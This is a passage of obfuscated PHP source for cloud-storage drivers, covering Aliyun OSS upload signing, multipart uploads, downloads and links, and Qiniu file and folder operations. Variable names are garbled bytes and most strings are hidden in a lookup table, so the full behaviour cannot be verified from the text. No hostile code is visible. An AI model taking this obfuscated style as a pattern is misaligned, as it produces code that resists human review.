DateTime($Ó¥©²…Ê); $…¹¶ÂŒ‹ = $Ü˜ª£Á»->format(DateTime::ISO8601); $çÅ¡úÜğ = strpos($…¹¶ÂŒ‹, $ô±éİ²Ã[373]); $…¹¶ÂŒ‹ = substr($…¹¶ÂŒ‹, 0, $çÅ¡úÜğ) . $ô±éİ²Ã[1488]; $¢±éç§ = 1048576000 * 5; $œ–ƒß©à = $this->pathFather($ú‹¦êîß); $“±ËË»í = array($ô±éİ²Ã[264] => $…¹¶ÂŒ‹, $ô±éİ²Ã[267] => array(array($ô±éİ²Ã[1489], 0, $¢±éç§), array($ô±éİ²Ã[269], $ô±éİ²Ã[270], $œ–ƒß©à))); $…˜˜©î = base64_encode(json_encode($“±ËË»í)); $¦‹¿ìİõ = base64_encode(hash_hmac($ô±éİ²Ã[1410], $…˜˜©î, $this->secret, !0)); $ÉÔÄ…àø = array($ô±éİ²Ã[1490] => $this->accessKey, $ô±éİ²Ã[279] => $…˜˜©î, $ô±éİ²Ã[272] => $ô±éİ²Ã[263], $ô±éİ²Ã[1491] => $¦‹¿ìİõ, $ô±éİ²Ã[208] => $¬‹ µªö); $ÉÔÄ…àø = $this->trafficLimit($ô±éİ²Ã[1485], $ÉÔÄ…àø, !0); return $ÉÔÄ…àø; } public function uploadMultiData($ª©Åê÷, $İ¥°Ö‘™ = 3600) { $åû¥–­ =& $_SERVER[Š—Â“œÔ]; if (!($¡‹Š‘Âõ = $this->getHost())) { return !1; } $æ«Î£çÓ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ª©Åê÷)); return array($åû¥–­[283] => $æ«Î£çÓ, $åû¥–­[208] => $¡‹Š‘Âõ . $åû¥–­[8] . $this->pathEncode($ª©Åê÷), $åû¥–­[284] => gmdate($åû¥–­[1492]), $åû¥–­[97] => $ª©Åê÷); } public function uploadMultiAuth($Øó÷İµª, $—ƒ‚¨ÀÊ = array()) { if (isset($—ƒ‚¨ÀÊ[$_SERVER[Š—Â“œÔ][285]])) { return $this->uploadPartAuth($Øó÷İµª, $—ƒ‚¨ÀÊ); } return $this->uploadListAuth($Øó÷İµª, $—ƒ‚¨ÀÊ); } private function uploadPartAuth($÷Êóş™ö, $§ÂóÁÇ  = array()) { $¹ş¡ú½² =& $_SERVER[Š—Â“œÔ]; $ßÁŸšÈ = $§ÂóÁÇ [$¹ş¡ú½²[97]]; $÷‹¢ûñÇ = $this->_getUploadAuth($ßÁŸšÈ, $§ÂóÁÇ ); $ÜîÇ©ÄĞ = array($¹ş¡ú½²[288] => $÷‹¢ûñÇ[$¹ş¡ú½²[288]], $¹ş¡ú½²[284] => $÷‹¢ûñÇ[$¹ş¡ú½²[284]]); if (isset($÷‹¢ûñÇ[$¹ş¡ú½²[1493]])) { $ÜîÇ©ÄĞ[$¹ş¡ú½²[1493]] = $÷‹¢ûñÇ[$¹ş¡ú½²[1493]]; } return $ÜîÇ©ÄĞ; } private function uploadListAuth($³«¥·¾°, $ç¥í—Ö = array()) { $°¿Êò†Ş =& $_SERVER[Š—Â“œÔ]; $Ø¬í¥éğ = $ç¥í—Ö[$°¿Êò†Ş[97]]; $ÑàÌŞŞü = $ç¥í—Ö[$°¿Êò†Ş[283]]; $ŞèŠÎ™† = $this->client->listParts($this->bucket, $this->pathEncode($Ø¬í¥éğ), $ÑàÌŞŞü); $ÍóÓŒü = $ŞèŠÎ™†->getListPart(); $ä‚Š®¬ƒ = array(); foreach ($ÍóÓŒü as $˜µ¸“‡ù) { $ä‚Š®¬ƒ[] = array($°¿Êò†Ş[299] => $˜µ¸“‡ù->getPartNumber(), $°¿Êò†Ş[300] => trim($˜µ¸“‡ù->getETag(), $°¿Êò†Ş[121])); } if (!$ä‚Š®¬ƒ) { return !1; } $ë°œ£îÒ = $this->_getUploadAuth($Ø¬í¥éğ, $ç¥í—Ö); return array($°¿Êò†Ş[288] => $ë°œ£îÒ[$°¿Êò†Ş[288]], $°¿Êò†Ş[284] => $ë°œ£îÒ[$°¿Êò†Ş[284]], $°¿Êò†Ş[291] => $ä‚Š®¬ƒ); } private function _getUploadAuth($ÍãÀÙ¬Š, $–‹ÈÆªŞ) { $Ó™çŒÜ =& $_SERVER[Š—Â“œÔ]; $²Ú£Ï = gmdate($Ó™çŒÜ[1492]); $í‰ôŒæã = isset($–‹ÈÆªŞ[$Ó™çŒÜ[285]]) ? $Ó™çŒÜ[255] : $Ó™çŒÜ[290]; $ğ”ï’ñ’ = array_intersect_key($–‹ÈÆªŞ, array_flip(array($Ó™çŒÜ[285], $Ó™çŒÜ[283]))); ksort($ğ”ï’ñ’); $‰Â€›ô½ = $ğ”ï’ñ’ ? $Ó™çŒÜ[76] . http_build_query($ğ”ï’ñ’, null, $Ó™çŒÜ[286], PHP_QUERY_RFC3986) : $Ó™çŒÜ[12]; $ÇÄŠÙ…„ = array($í‰ôŒæã, $Ó™çŒÜ[12], $Ó™çŒÜ[123], $²Ú£Ï, "\x78\x2d\157\x73\163\x2d\144\x61\x74\x65\x3a{$²Ú£Ï}", $Ó™çŒÜ[8] . $this->bucket . $Ó™çŒÜ[8] . $ÍãÀÙ¬Š . $‰Â€›ô½); if (isset($–‹ÈÆªŞ[$Ó™çŒÜ[285]])) { $Ô›ş¥µÄ = $this->trafficLimit($Ó™çŒÜ[1485], array(), !0); if ($Ô›ş¥µÄ) { $ÍãÀÙ¬Š = $Ó™çŒÜ[1493]; array_splice($ÇÄŠÙ…„, 5, 0, $ÍãÀÙ¬Š . $Ó™çŒÜ[4] . $Ô›ş¥µÄ[$ÍãÀÙ¬Š]); } } $âËÉøº– = implode($Ó™çŒÜ[287], $ÇÄŠÙ…„); $»ÑñÁ†¾ = base64_encode(hash_hmac($Ó™çŒÜ[1410], $âËÉøº–, $this->secret, !0)); $¥·Ë•ñç = $Ó™çŒÜ[1462] . $this->accessKey . $Ó™çŒÜ[4] . $»ÑñÁ†¾; $¾Á´¡å = array($Ó™çŒÜ[288] => $¥·Ë•ñç, $Ó™çŒÜ[284] => $²Ú£Ï); if (!empty($Ô›ş¥µÄ)) { $¾Á´¡å = array_merge($¾Á´¡å, $Ô›ş¥µÄ); } return $¾Á´¡å; } public function download($Ô´Ö»™ü, $Ã¶ Ôó) { $ùÕÔ»š =& $_SERVER[Š—Â“œÔ]; if ($this->isFolder($Ô´Ö»™ü)) { return !1; } try { $’Ï‡şÍ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ã¶ Ôó); $’Ï‡şÍ = $this->trafficLimit($ùÕÔ»š[112], $’Ï‡şÍ); $this->client->getObject($this->bucket, $this->pathEncode($Ô´Ö»™ü), $’Ï‡şÍ); } catch (OSS\Core\OssException $ğ×¾¢ƒÀ) { $this->writeLog(__FUNCTION__ . $ùÕÔ»š[214] . $ğ×¾¢ƒÀ->getMessage()); return !1; } return $Ã¶ Ôó; } public function fileSubstr($ÛÕĞİíİ, $è»şª¸Ç = 0, $Çû Óôõ = false) { if ($è»şª¸Ç === -1) { $¢ØëÄšÄ = array(); } else { if ($Çû Óôõ === !1) { $Ş ²úÁ£ = $this->size($ÛÕĞİíİ); } else { $Ş ²úÁ£ = $è»şª¸Ç + $Çû Óôõ - 1; } $¢ØëÄšÄ = array(OSS\OssClient::OSS_RANGE => "{$è»şª¸Ç}\x2d{$Ş ²úÁ£}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ÛÕĞİíİ), $¢ØëÄšÄ); } catch (OSS\Core\OssException $İ¥ÂŞ•) { $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][214] . $İ¥ÂŞ•->getMessage()); think_exception($İ¥ÂŞ•->getMessage()); return !1; } } private function trafficLimit($çéÖ›, $äß€ôö¤ = array(), $“‰Î‡ö× = false) { $›¡‚ôÉÁ =& $_SERVER[Š—Â“œÔ]; if ($çéÖ› == $›¡‚ôÉÁ[1485] && $this->isUploadServer() || $çéÖ› == $›¡‚ôÉÁ[112] && $this->isFileOutServer()) { return $äß€ôö¤; } $Ş Âœ…€ = floatval($GLOBALS[$›¡‚ôÉÁ[6]][$›¡‚ôÉÁ[92]][$›¡‚ôÉÁ[110]][$çéÖ›]) * 1024 * 1024 * 8; if (!$Ş Âœ…€) { return $äß€ôö¤; } $Ş Âœ…€ = $Ş Âœ…€ < 819200 ? 819200 : ($Ş Âœ…€ > 838860800 ? 838860800 : $Ş Âœ…€); if ($“‰Î‡ö×) { $äß€ôö¤[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ş Âœ…€); } else { if (!isset($äß€ôö¤[OSS\OssClient::OSS_HEADERS])) { $äß€ôö¤[OSS\OssClient::OSS_HEADERS] = array(); } $äß€ôö¤[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ş Âœ…€); } return $äß€ôö¤; } public function link($Í‰åû—ì, $Òá¡®† = array()) { $œ”†®’ =& $_SERVER[Š—Â“œÔ]; if (!$this->exist($Í‰åû—ì) || $this->isFolder($Í‰åû—ì)) { return !1; } try { $Òá¡®† = $this->trafficLimit($œ”†®’[112], $Òá¡®†, !0); $ï¹®“¡š = $this->client->signUrl($this->bucket, $this->pathEncode($Í‰åû—ì), 3600 * 12, $œ”†®’[1494], $Òá¡®†); return $this->getCdnLink($ï¹®“¡š); } catch (OSS\Core\OssException $Ôô˜¬­Ì) { $this->writeLog(__FUNCTION__ . $œ”†®’[214] . $Ôô˜¬­Ì->getMessage()); return !1; } } public function fileOut($ „óù„¤, $Ç£ÕÉ® = false, $òØğÊ¡ = false, $Æ¥«Ëúö = '') { $‹êé‰¶ =& $_SERVER[Š—Â“œÔ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ „óù„¤, $Ç£ÕÉ®, $òØğÊ¡, $Æ¥«Ëúö); } if (!$òØğÊ¡) { $òØğÊ¡ = $this->pathThis($ „óù„¤); } $òØğÊ¡ = rawurlencode($òØğÊ¡); $Ë¹ Á½ = get_file_mime(get_path_ext($òØğÊ¡)); if ($Ë¹ Á½ == $‹êé‰¶[250]) { return parent::fileOut($ „óù„¤, $Ç£ÕÉ®, $òØğÊ¡, $Æ¥«Ëúö); } $Ç£ÕÉ® = $Ç£ÕÉ® ? $‹êé‰¶[1495] : $‹êé‰¶[1496]; $­™ÔËÇÛ = array(OSS\OssClient::OSS_SUB_RESOURCE => $‹êé‰¶[1497] . rawurlencode("{$Ç£ÕÉ®}\73\x66\151\154\x65\156\141\x6d\x65\75{$òØğÊ¡}")); $­™ÔËÇÛ[OSS\OssClient::OSS_SUB_RESOURCE] .= $‹êé‰¶[1498] . rawurlencode($Ë¹ Á½); $­¼£÷®ş = $this->link($ „óù„¤, $­™ÔËÇÛ); $this->fileOutLink($­¼£÷®ş); } public function fileOutServer($Ã×ö£», $‰”ğ¨ô¾ = false, $ØÍØÊÏù = false, $èà¬å†Å = '') { parent::fileOut($Ã×ö£», $‰”ğ¨ô¾, $ØÍØÊÏù, $èà¬å†Å); } public function fileOutImage($œÛ¼½¼¾, $…‚Ô‡šÄ = 250) { if ($this->size($œÛ¼½¼¾) > 1024 * 1024 * 20) { return $this->fileOutImageServer($œÛ¼½¼¾, $…‚Ô‡šÄ); } $êùúø¦â = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Š—Â“œÔ][1459] . $…‚Ô‡šÄ); $¡ƒ“èªƒ = $this->link($œÛ¼½¼¾, $êùúø¦â); $this->fileOutLink($¡ƒ“èªƒ); } public function fileOutImageServer($çÔĞ„‚Ù, $“®¿ôÓ = 250) { parent::fileOutImage($çÔĞ„‚Ù, $“®¿ôÓ); } public function fileOutLink($–«æç»è) { $ÏÍ¨ù•æ =& $_SERVER[Š—Â“œÔ]; if (!$this->isCdnHost() && substr($–«æç»è, 0, 7) == $ÏÍ¨ù•æ[218]) { $–«æç»è = $ÏÍ¨ù•æ[219] . substr($–«æç»è, 7); } header($ÏÍ¨ù•æ[175] . $–«æç»è); die; } public function hashMd5($êÍ„ÍŠß, $øØ¢²Ø = '') { $ãàÖÅ¹Ù =& $_SERVER[Š—Â“œÔ]; $ŞÁ‹¹½í = $this->_objectMeta($êÍ„ÍŠß); if (!$ŞÁ‹¹½í) { return $ãàÖÅ¹Ù[12]; } if (!isset($ŞÁ‹¹½í[$ãàÖÅ¹Ù[1479]]) && !empty($øØ¢²Ø)) { $½Ó÷˜¿› = $this->updateObjMeta($êÍ„ÍŠß, array($ãàÖÅ¹Ù[1479] => $øØ¢²Ø)); $ŞÁ‹¹½í[$ãàÖÅ¹Ù[1479]] = $½Ó÷˜¿› ? $øØ¢²Ø : $ãàÖÅ¹Ù[12]; } return isset($ŞÁ‹¹½í[$ãàÖÅ¹Ù[1479]]) ? strtolower($ŞÁ‹¹½í[$ãàÖÅ¹Ù[1479]]) : $ãàÖÅ¹Ù[12]; } public function size($Áù–ğ‘¼) { $Ä¸å×³ = $this->objectMeta($Áù–ğ‘¼); return $Ä¸å×³ ? $Ä¸å×³[$_SERVER[Š—Â“œÔ][79]] : 0; } public function info($âşØú„) { if ($this->isFolder($âşØú„)) { return $this->folderInfo($âşØú„); } else { if ($this->isFile($âşØú„)) { return $this->fileInfo($âşØú„); } } return !1; } public function exist($œöûÈî) { return $this->isFile($œöûÈî) || $this->isFolder($œöûÈî); } public function isFile($ƒ“æ³Ç) { return !$this->isFolder($ƒ“æ³Ç) && $this->objectMeta($ƒ“æ³Ç); } public function isFolder($ë©Ş—) { return $this->cacheMethod($_SERVER[Š—Â“œÔ][179], $ë©Ş—); } protected function objectMeta($ÔíœŒ‚Á) { return $this->cacheMethod($_SERVER[Š—Â“œÔ][181], $ÔíœŒ‚Á); } protected function _objectMeta($¹ÈÕË›®) { $˜•“ÜŸ =& $_SERVER[Š—Â“œÔ]; try { $ÌŠïËç = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¹ÈÕË›®)); } catch (OSS\Core\OssException $±˜ãê”) { $this->writeLog(__FUNCTION__ . $˜•“ÜŸ[214] . $±˜ãê”->getMessage()); $ÌŠïËç = !1; } if ($ÌŠïËç) { $ÌŠïËç[$˜•“ÜŸ[79]] = intval($ÌŠïËç[$˜•“ÜŸ[1477]]); } return $ÌŠïËç; } protected function _isFolder($½œŸ×­°) { $àçƒª·Š =& $_SERVER[Š—Â“œÔ]; if ($½œŸ×­° == $àçƒª·Š[12] || $½œŸ×­° == $àçƒª·Š[8]) { return !0; } $À—Öşò× = array($àçƒª·Š[1472] => $àçƒª·Š[8], $àçƒª·Š[1473] => rtrim($½œŸ×­°, $àçƒª·Š[8]) . $àçƒª·Š[8], $àçƒª·Š[1474] => 1, $àçƒª·Š[1475] => $àçƒª·Š[12]); $’–‰ËÄ² = $this->client->listObjects($this->bucket, $À—Öşò×); if ($’–‰ËÄ²->getObjectList() || $’–‰ËÄ²->getPrefixList()) { return !0; } return !1; } public function writeLog($ºÕöºŒš = '', $æù¦Âı = false) { $Úñ‘¥µ´ =& $_SERVER[Š—Â“œÔ]; $¢ÏéÛ‰Ë = in_array(ACTION, array($Úñ‘¥µ´[212], $Úñ‘¥µ´[213])); if (!$¢ÏéÛ‰Ë && !GLOBAL_DEBUG) { return; } $Ø¢›ìÜğ = 0; if (stripos($ºÕöºŒš, $Úñ‘¥µ´[1499]) !== !1) { $Ø¢›ìÜğ = 1; $¯ÄÌ—¨¯ = explode($Úñ‘¥µ´[1500], $ºÕöºŒš); $ºÕöºŒš = !empty($¯ÄÌ—¨¯[1]) ? $¯ÄÌ—¨¯[1] : $ºÕöºŒš; } else { if (stripos($ºÕöºŒš, $Úñ‘¥µ´[1501])) { $Ø¢›ìÜğ = 2; $¯ÄÌ—¨¯ = explode($Úñ‘¥µ´[1501], $ºÕöºŒš); $¯ÄÌ—¨¯ = explode($Úñ‘¥µ´[4], $¯ÄÌ—¨¯[0]); $ºÕöºŒš = !empty($¯ÄÌ—¨¯[1]) ? $¯ÄÌ—¨¯[1] : $ºÕöºŒš; } } if ($¢ÏéÛ‰Ë && I18n::getType() == $Úñ‘¥µ´[1502]) { if ($Ø¢›ìÜğ == 1) { $ºÕöºŒš = str_replace($Úñ‘¥µ´[1503], $Úñ‘¥µ´[1504], $ºÕöºŒš); } else { if ($Ø¢›ìÜğ == 2) { $¯ÄÌ—¨¯ = explode($Úñ‘¥µ´[214], $¯ÄÌ—¨¯[0]); $İ æ´èâ = isset($¯ÄÌ—¨¯[1]) ? $¯ÄÌ—¨¯[1] : $Úñ‘¥µ´[12]; $‡ƒÊıÂã = array($Úñ‘¥µ´[1505] => $Úñ‘¥µ´[1506], $Úñ‘¥µ´[1507] => $Úñ‘¥µ´[1508], $Úñ‘¥µ´[1509] => $Úñ‘¥µ´[1510], $Úñ‘¥µ´[1511] => $Úñ‘¥µ´[1512], $Úñ‘¥µ´[1513] => $Úñ‘¥µ´[1514], $Úñ‘¥µ´[1515] => $Úñ‘¥µ´[1516], $Úñ‘¥µ´[1517] => $Úñ‘¥µ´[1518], $Úñ‘¥µ´[1519] => $Úñ‘¥µ´[1520], $Úñ‘¥µ´[1521] => $Úñ‘¥µ´[1522], $Úñ‘¥µ´[1523] => $Úñ‘¥µ´[1524]); if (isset($‡ƒÊıÂã[$İ æ´èâ])) { $ºÕöºŒš = $‡ƒÊıÂã[$İ æ´èâ]; } } } if (stripos($ºÕöºŒš, $Úñ‘¥µ´[1525])) { $ºÕöºŒš = $Úñ‘¥µ´[1526]; } } if (!trim($ºÕöºŒš)) { return; } parent::writeLog(trim($ºÕöºŒš), $æù¦Âı); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Ô¹Øí²) { parent::__construct(); require_once SDK_DIR . $_SERVER[Š—Â“œÔ][1527]; $this->_init($Ô¹Øí²); } public function _init($°ÙÍ‹¾“) { $™ö¶ÀÍ¢ =& $_SERVER[Š—Â“œÔ]; $this->config = $°ÙÍ‹¾“; foreach ($°ÙÍ‹¾“ as $æîÏÔëÈ => $ŞÔ¹¨‰í) { if (isset($this->{$æîÏÔëÈ})) { $this->{$æîÏÔëÈ} = $ŞÔ¹¨‰í; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($™ö¶ÀÍ¢[1528] . LNG($™ö¶ÀÍ¢[1463])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($›Ç¯Ÿ¸ö, $òÓ‹£ŞÇ = '', $ê‹†•Ë = REPEAT_RENAME) { if ($this->setContent($›Ç¯Ÿ¸ö, $òÓ‹£ŞÇ)) { return $this->getPathOuter($›Ç¯Ÿ¸ö); } return !1; } public function mkdir($Á¤ª‚†°, $ÈÃ‚Â´ß = REPEAT_SKIP) { $§İ§¼ï­ =& $_SERVER[Š—Â“œÔ]; $íû˜ˆëÌ = trim($Á¤ª‚†°, $§İ§¼ï­[8]); if ($this->_isFolder($íû˜ˆëÌ)) { return $this->getPathOuter($íû˜ˆëÌ); } $Á¤ª‚†° = $íû˜ˆëÌ . $§İ§¼ï­[8]; $ï£Ö¾ı­ = get_path_this($íû˜ˆëÌ); $µ”œö¶ = $Á¤ª‚†° . $ï£Ö¾ı­; if (!$this->mkfile($µ”œö¶)) { return !1; } if (!$this->moveFile($µ”œö¶, $Á¤ª‚†°)) { $this->delFile($µ”œö¶); return !1; } return $this->getPathOuter($íû˜ˆëÌ); } public function copyFile($¬ì†Ç·, $Êİª„äÃ) { $Ö¡¸ä³— = $this->bucketManager->copy($this->bucket, $¬ì†Ç·, $this->bucket, $Êİª„äÃ, !0); return $Ö¡¸ä³— ? !1 : $this->getPathOuter($Êİª„äÃ); } public function moveFile($éë€êİÎ, $šÀï“¹Ì) { $‹ÉÊÅşó = $this->bucketManager->move($this->bucket, $éë€êİÎ, $this->bucket, $šÀï“¹Ì, !0); return $‹ÉÊÅşó ? !1 : $this->getPathOuter($šÀï“¹Ì); } public function delFile($Òúø˜®Ñ) { if (!$this->exist($Òúø˜®Ñ)) { return !0; } $É²§³Š = $this->bucketManager->delete($this->bucket, $Òúø˜®Ñ); if (!$É²§³Š) { return !0; } return $É²§³Š->code() == 612 ? !0 : !1; } public function delFolder($¥É•†¼ø) { $¥Æ£Ø–Ã =& $_SERVER[Š—Â“œÔ]; if (!$this->exist($¥É•†¼ø)) { return !0; } $this->listItemCache = !1; $ÄÈ…¸û = $this->fileList($¥É•†¼ø); $this->listItemCache = !0; $Ûôöò“º = trim($¥É•†¼ø, $¥Æ£Ø–Ã[8]) . $¥Æ£Ø–Ã[8]; if (!empty($¥É•†¼ø) && $¥É•†¼ø !== $¥Æ£Ø–Ã[230] && !in_array($Ûôöò“º, $ÄÈ…¸û[$¥Æ£Ø–Ã[85]])) { $ÄÈ…¸û[$¥Æ£Ø–Ã[85]][] = $Ûôöò“º; } $äÅúÔ¡û = $this->delByBatch($ÄÈ…¸û[$¥Æ£Ø–Ã[86]]); if (!$äÅúÔ¡û) { return !1; } $äÅúÔ¡û = $this->delByBatch($ÄÈ…¸û[$¥Æ£Ø–Ã[85]]); if (!$äÅúÔ¡û) { return !1; } return $this->delFile($Ûôöò“º); } private function delByBatch($çĞÍğÅø) { foreach (array_chunk($çĞÍğÅø, 1000) as $¤—¦³×Ï) { $©øİïÌÉ = $this->bucketManager->buildBatchDelete($this->bucket, $¤—¦³×Ï); list($æåîÃ¤ë, $ÔÔİ“–ú) = $this->bucketManager->batch($©øİïÌÉ); if ($ÔÔİ“–ú) { return !1; } } return !0; } public function rename($Ç‡¶ÎÁ•, $Ø®ò´½‹) { return $this->renameObject($Ç‡¶ÎÁ•, $Ø®ò´½‹); } public function fileInfo($ÎæÖË–Ø, $•îÀ°Ûª = false, $ ¼Å£Ü = array()) { $ŸÂòÓ‰û =& $_SERVER[Š—Â“œÔ]; $ùÎéã‚ = array($ŸÂòÓ‰û[32] => $this->pathThis($ÎæÖË–Ø), $ŸÂòÓ‰û[87] => $this->getPathOuter($ŸÂòÓ‰û[8] . $ÎæÖË–Ø), $ŸÂòÓ‰û[33] => $ŸÂòÓ‰û[232], $ŸÂòÓ‰û[79] => isset($ ¼Å£Ü[$ŸÂòÓ‰û[1529]]) ? $ ¼Å£Ü[$ŸÂòÓ‰û[1529]] : 0, $ŸÂòÓ‰û[169] => $this->ext($ÎæÖË–Ø)); if ($•îÀ°Ûª) { return $ùÎéã‚; } $ùÎéã‚[$ŸÂòÓ‰û[233]] = $ùÎéã‚[$ŸÂòÓ‰û[88]] = 0; $ùÎéã‚[$ŸÂòÓ‰û[234]] = $ùÎéã‚[$ŸÂòÓ‰û[235]] = !0; if (empty($ ¼Å£Ü)) { $ ¼Å£Ü = $this->objectMeta($ÎæÖË–Ø); if (!$ ¼Å£Ü) { return $ùÎéã‚; } } if (isset($ ¼Å£Ü[$ŸÂòÓ‰û[236]]) && $ ¼Å£Ü[$ŸÂòÓ‰û[236]]) { $ùÎéã‚[$ŸÂòÓ‰û[237]] = $ ¼Å£Ü[$ŸÂòÓ‰û[236]]; } if (isset($ ¼Å£Ü[$ŸÂòÓ‰û[247]]) && $ ¼Å£Ü[$ŸÂòÓ‰û[247]]) { $ùÎéã‚[$ŸÂòÓ‰û[237]] = $ ¼Å£Ü[$ŸÂòÓ‰û[247]]; } if (isset($ ¼Å£Ü[$ŸÂòÓ‰û[1530]])) { $ùÎéã‚[$ŸÂòÓ‰û[88]] = substr($ ¼Å£Ü[$ŸÂòÓ‰û[1530]] . $ŸÂòÓ‰û[12], 0, 10); } if (isset($ ¼Å£Ü[$ŸÂòÓ‰û[1529]])) { $ùÎéã‚[$ŸÂòÓ‰û[79]] = $ ¼Å£Ü[$ŸÂòÓ‰û[1529]]; } return $ùÎéã‚; } public function folderInfo($«Ò—øù², $‘â•Û  = false) { $º™àÓü =& $_SERVER[Š—Â“œÔ]; $¹¼ü¹¾ = array($º™àÓü[32] => $this->pathThis($«Ò—øù²), $º™àÓü[87] => $this->getPathOuter($º™àÓü[8] . $«Ò—øù²), $º™àÓü[33] => $º™àÓü[78]); if ($‘â•Û ) { return $¹¼ü¹¾; } $¹¼ü¹¾[$º™àÓü[233]] = $¹¼ü¹¾[$º™àÓü[88]] = 0; $¹¼ü¹¾[$º™àÓü[234]] = $¹¼ü¹¾[$º™àÓü[235]] = !0; $«Ò—øù² = rtrim($«Ò—øù², $º™àÓü[8]) . $º™àÓü[8]; $‚õ°„ÚÁ = $this->objectMeta($«Ò—øù²); if (isset($‚õ°„ÚÁ[$º™àÓü[1530]])) { $¹¼ü¹¾[$º™àÓü[88]] = substr($‚õ°„ÚÁ[$º™àÓü[1530]] . $º™àÓü[12], 0, 10); } return $¹¼ü¹¾; } public function listPath($±¤´·¥ì, $ ¹”ä ˜ = false) { $º„Á¯ØÇ =& $_SERVER[Š—Â“œÔ]; $Ä®ÂŠŞ = $this->fileList($±¤´·¥ì, $º„Á¯ØÇ[8], !0); foreach ($Ä®ÂŠŞ[$º„Á¯ØÇ[85]] as $»´ì¡Ãï => $ë‚ Ê¢) { $Ä®ÂŠŞ[$º„Á¯ØÇ[85]][$»´ì¡Ãï] = $this->folderInfo($ë‚ Ê¢, $ ¹”ä ˜); } foreach ($Ä®ÂŠŞ[$º„Á¯ØÇ[86]] as $»´ì¡Ãï => $ë‚ Ê¢) { $Ä®ÂŠŞ[$º„Á¯ØÇ[86]][$»´ì¡Ãï] = $this->fileInfo($ë‚ Ê¢[$º„Á¯ØÇ[97]], $ ¹”ä ˜, $ë‚ Ê¢); } return $Ä®ÂŠŞ; } public function has($¢ı»³œ÷, $Ú¥¾Ò¢ = false, $è¿úÏŒ = true) { $ü—ˆ€¼ç =& $_SERVER[Š—Â“œÔ]; $¢ı»³œ÷ = trim($¢ı»³œ÷, $ü—ˆ€¼ç[8]); $™¹Ş”³á = empty($¢ı»³œ÷) && $¢ı»³œ÷ !== $ü—ˆ€¼ç[230] ? $ü—ˆ€¼ç[12] : $¢ı»³œ÷ . $ü—ˆ€¼ç[8]; $ë‰Ùù¾û = $ü—ˆ€¼ç[12]; $Ÿ ›Œó = 500; $‹“ÙÚ–­ = $ü—ˆ€¼ç[8]; $Ú¼¤ŸœÈ = $«ŠøŠé· = 0; while (!0) { check_abort(); list($ğÇòÇë“, $Ù„Áğ½³) = $this->bucketManager->listFiles($this->bucket, $™¹Ş”³á, $ë‰Ùù¾û, $Ÿ ›Œó, $‹“ÙÚ–­); if ($Ù„Áğ½³) { break; } $ë‰Ùù¾û = array_key_exists($ü—ˆ€¼ç[1475], $ğÇòÇë“) ? $ë‰Ùù¾û = $ğÇòÇë“[$ü—ˆ€¼ç[1531]] : $ü—ˆ€¼ç[12]; if ($Ú¥¾Ò¢) { if (!empty($ğÇòÇë“[$ü—ˆ€¼ç[1532]])) { $Ú¼¤ŸœÈ += count($ğÇòÇë“[$ü—ˆ€¼ç[1532]]); } if (!empty($ğÇòÇë“[$ü—ˆ€¼ç[1533]])) { $«ŠøŠé· += count($ğÇòÇë“[$ü—ˆ€¼ç[1533]]); } if ($ë‰Ùù¾û === $ü—ˆ€¼ç[12]) { break; } continue; } if ($è¿úÏŒ) { if (!empty($ğÇòÇë“[$ü—ˆ€¼ç[1532]])) { return !0; } } else { if (!empty($ğÇòÇë“[$ü—ˆ€¼ç[1533]])) { return !0; } } if ($ë‰Ùù¾û === $ü—ˆ€¼ç[12]) { break; } } if ($Ú¥¾Ò¢) { return array($ü—ˆ€¼ç[241] => $Ú¼¤ŸœÈ, $ü—ˆ€¼ç[242] => $«ŠøŠé·); } return !1; } public function listAll($«Ñ´üõè) { $í”Ü´«ƒ =& $_SERVER[Š—Â“œÔ]; $õ—Áµ¦ş = $this->fileList($«Ñ´üõè, $í”Ü´«ƒ[12], !0); $Ÿ—¬õ» = array_to_keyvalue($õ—Áµ¦ş[$í”Ü´«ƒ[86]], $í”Ü´«ƒ[32]); foreach ($õ—Áµ¦ş[$í”Ü´«ƒ[85]] as $éõ­»¹Í) { if (is_string($éõ­»¹Í)) { $Ÿ—¬õ»[$éõ­»¹Í] = array($í”Ü´«ƒ[79] => 0); } } return $this->listAllFiles($«Ñ´üõè, $Ÿ—¬õ»); } private function fileList($ˆ˜†ô¯š, $”æŠš‹ü = '', $Û¾ÜÆĞ” = 0) { $ø½ü¶‚¾ =& $_SERVER[Š—Â“œÔ]; $ˆ˜†ô¯š = trim($ˆ˜†ô¯š, $ø½ü¶‚¾[8]); $‚ï™ÕÇÎ = empty($ˆ˜†ô¯š) && $ˆ˜†ô¯š !== $ø½ü¶‚¾[230] ? $ø½ü¶‚¾[12] : $ˆ˜†ô¯š . $ø½ü¶‚¾[8]; $Áğ­¨ÑÁ = $ø½ü¶‚¾[12]; $ó¢Óêë = 1000; $’©ÃœÁ¨ = $–ëçªš = array(); while (!0) { check_abort(); list($Æ½ã”Í, $¢Œ¾óÖ«) = $this->bucketManager->listFiles($this->bucket, $‚ï™ÕÇÎ, $Áğ­¨ÑÁ, $ó¢Óêë, $”æŠš‹ü); if ($¢Œ¾óÖ«) { break; } $Áğ­¨ÑÁ = array_key_exists($ø½ü¶‚¾[1475], $Æ½ã”Í) ? $Áğ­¨ÑÁ = $Æ½ã”Í[$ø½ü¶‚¾[1531]] : $ø½ü¶‚¾[12]; $ˆß‚Äƒ¸ = isset($Æ½ã”Í[$ø½ü¶‚¾[1532]]) ? $Æ½ã”Í[$ø½ü¶‚¾[1532]] : array(); 